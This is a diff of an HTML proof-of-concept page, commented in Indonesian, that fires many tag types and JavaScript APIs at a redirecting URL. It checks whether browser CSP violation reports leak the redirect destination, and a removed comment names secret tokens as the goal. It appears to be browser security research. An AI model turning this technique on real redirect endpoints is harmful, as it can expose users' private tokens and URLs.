@@ -2,89 +2,106 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline'; img-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self'; object-src 'none';">
-    <title>CSP Leak Multi-Component PoC</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline'; form-action 'self'; connect-src 'self';">
+    <title>Mass CSP Leak Tester</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; }
-        .log { background: #f4f4f4; padding: 10px; border-left: 4px solid #d9534f; margin-bottom: 10px; font-family: monospace; word-break: break-all;}
-        #hiddenContainer { display: none; }
+        body { font-family: monospace; background: #1e1e1e; color: #fff; padding: 20px; }
+        h2 { color: #00ff00; }
+        .log-container { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; }
+        .log-card { background: #2d2d2d; border: 1px solid #444; padding: 15px; border-radius: 5px; flex: 1 1 300px; }
+        .leak { color: #ff4444; font-weight: bold; word-break: break-all; }
+        .safe { color: #aaa; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; border-radius: 3px;}
+        button:hover { background: #00cc00; }
+        #hiddenZone { display: none; }
     </style>
 </head>
 <body>
 
-    <h2>Test Content Security Policy (CSP) Leaks</h2>
-    <p>Script ini bakal nge-inject berbagai macam tag HTML buat ngecek tag mana aja yang ngebocorin alamat redirect.</p>
-    
-    <button id="exploitBtn" style="padding: 10px 20px; cursor: pointer;">Run All Tests</button>
-    
-    <div style="margin-top: 20px;">
-        <h3>Violation Logs:</h3>
-        <div id="status">Waiting for user action...</div>
-    </div>
+    <h2>🔥 CSP Redirect Leak Mass Tester</h2>
+    <p>Targeting: <span style="color: yellow;">https://fb.com</span> (Expected Redirect: https://www.facebook.com)</p>
+    <button id="runBtn">Fire All Payloads</button>
 
-    <div id="hiddenContainer"></div>
+    <div class="log-container" id="results"></div>
+    <div id="hiddenZone"></div>
 
     <script>
-        const statusDiv = document.getElementById('status');
-        const container = document.getElementById('hiddenContainer');
+        const targetUrl = "https://fb.com/";
+        const resultsDiv = document.getElementById('results');
+        const hiddenZone = document.getElementById('hiddenZone');
 
-        // Target URL: Di server Python lo, bikin endpoint ini redirect ke URL rahasia/external
-        // Contoh: http://localhost:8000/redirect -> Location: https://target.com/secret-token
-        const targetUrl = "https://fb.com"; 
-
-        // Listener buat nangkep laporan satpam (CSP)
+        // Global listener buat nangkep semua CSP violations
         document.addEventListener('securitypolicyviolation', (e) => {
-            // Kita log Tag apa yang bikin masalah, dan URL apa yang bocor
-            const tagName = e.target ? e.target.tagName : 'API/Fetch';
+            const triggerName = e.target ? (e.target.tagName || 'Document/API') : 'Unknown';
+            const method = e.violatedDirective;
             
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log';
-            logEntry.innerHTML = `
-                <b>Trigger:</b> <code>&lt;${tagName}&gt;</code><br>
-                <b>Directive:</b> ${e.violatedDirective}<br>
-                <b>LEAKED URI:</b> <span style="color:red; font-weight:bold;">${e.blockedURI}</span>
+            // Cek apakah yang bocor itu URL asli (fb.com) atau hasil redirect (facebook.com)
+            const isLeaking = e.blockedURI.includes('www.facebook.com');
+            const statusColor = isLeaking ? 'leak' : 'safe';
+            const statusText = isLeaking ? '⚠️ REDIRECT LEAKED' : '✅ Original URI (Spec Compliant)';
+
+            const card = document.createElement('div');
+            card.className = 'log-card';
+            card.innerHTML = `
+                <div style="color: #88ccff; margin-bottom: 5px;">[ ${triggerName} ] - ${method}</div>
+                <div>Status: <span class="${statusColor}">${statusText}</span></div>
+                <div style="margin-top: 8px; font-size: 0.9em; color: #aaa;">Blocked URI:</div>
+                <div class="${statusColor}">${e.blockedURI}</div>
             `;
-            statusDiv.appendChild(logEntry);
-            console.log(`[${tagName}] Violation object:`, e);
+            resultsDiv.appendChild(card);
         });
 
-        document.getElementById('exploitBtn').addEventListener('click', () => {
-            statusDiv.innerHTML = ""; // Bersihin log lama
-            container.innerHTML = ""; // Bersihin element lama
+        document.getElementById('runBtn').addEventListener('click', () => {
+            resultsDiv.innerHTML = "";
+            hiddenZone.innerHTML = "";
 
-            // 1. Iframe Test
-            const iframe = document.createElement('iframe');
-            iframe.src = targetUrl;
-            container.appendChild(iframe);
+            // 1. Array berisi nama-nama tag HTML sederhana
+            const simpleTags = ['iframe', 'img', 'script', 'audio', 'video', 'embed', 'object', 'track', 'source'];
+            
+            simpleTags.forEach(tag => {
+                const el = document.createElement(tag);
+                // Gunakan properti yang sesuai untuk masukin URL
+                if (['iframe', 'img', 'script', 'audio', 'video', 'embed', 'track'].includes(tag)) {
+                    el.src = targetUrl;
+                } else if (tag === 'object') {
+                    el.data = targetUrl;
+                } else if (tag === 'source') {
+                    el.srcset = targetUrl;
+                }
+                hiddenZone.appendChild(el);
+            });
 
-            // 2. Image Test
-            const img = document.createElement('img');
-            img.src = targetUrl;
-            container.appendChild(img);
+            // 2. Stylesheet & Prefetching (Tag <link>)
+            ['stylesheet', 'prefetch', 'prerender', 'preload'].forEach(rel => {
+                const link = document.createElement('link');
+                link.rel = rel;
+                link.href = targetUrl;
+                hiddenZone.appendChild(link);
+            });
 
-            // 3. Script Test
-            const script = document.createElement('script');
-            script.src = targetUrl;
-            container.appendChild(script);
+            // 3. Form Submission (Auto-submit form ke target)
+            const form = document.createElement('form');
+            form.action = targetUrl;
+            form.method = "GET";
+            hiddenZone.appendChild(form);
+            form.submit(); // Trigger form
 
-            // 4. Stylesheet (Link) Test
-            const link = document.createElement('link');
-            link.rel = "stylesheet";
-            link.href = targetUrl;
-            container.appendChild(link);
+            // 4. JavaScript APIs
+            // Fetch API
+            fetch(targetUrl, { mode: 'no-cors' }).catch(() => {});
+            
+            // XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', targetUrl);
+            xhr.send();
 
-            // 5. Object Test (Biasanya buat Flash/PDF, ini ketat banget aturan CSP-nya)
-            const obj = document.createElement('object');
-            obj.data = targetUrl;
-            container.appendChild(obj);
+            // Beacon API (Sering dipake buat tracking, menarik buat di-test)
+            navigator.sendBeacon(targetUrl, "test");
 
-            // 6. Audio/Video (Media) Test
-            const audio = document.createElement('audio');
-            audio.src = targetUrl;
-            container.appendChild(audio);
-
-            // 7. Fetch API Test (JavaScript request langsung)
-            fetch(targetUrl, { mode: 'no-cors' }).catch(err => console.log("Fetch failed naturally"));
+            // Web Worker (Bisa nge-trigger koneksi tersendiri)
+            try {
+                const worker = new Worker(targetUrl);
+            } catch(e) {}
         });
     </script>
 
